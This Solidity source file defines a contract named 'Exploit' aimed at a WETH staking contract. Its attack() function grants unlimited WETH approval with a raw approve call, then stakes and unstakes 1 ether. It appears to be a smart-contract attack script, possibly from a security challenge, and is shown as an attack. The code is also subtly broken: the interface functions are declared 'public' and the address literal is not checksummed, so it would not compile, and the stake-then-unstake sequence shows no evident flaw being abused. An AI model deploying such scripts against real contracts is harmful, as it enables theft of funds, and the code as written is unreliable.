pragma solidity ^0.8.0;

interface IStake {
    function StakeWETH(uint256 amount) public returns (bool);
    function Unstake(uint256 amount) public returns (bool);
}

contract Exploit {

    IStake public immutable stake;

    address public targetWETH = 0xa16e02e87b7454126e5e10d957a927a7f5b5d2be;

    constructor(address _stake) {
        stake = IStake(_stake);
    }

    function attack() public {
        (bool approved,) = targetWETH.call(abi.encodeWithSelector(0x095ea7b3, address(stake), type(uint256).max));
        require(approved, "Approve failed");
        bool staked = stake.StakeWETH(1000000000000000000);
        require(staked, "StakeWETH failed");
        bool unstaked = stake.Unstake(1000000000000000000);
        require(unstaked, "Unstake failed");
    }

}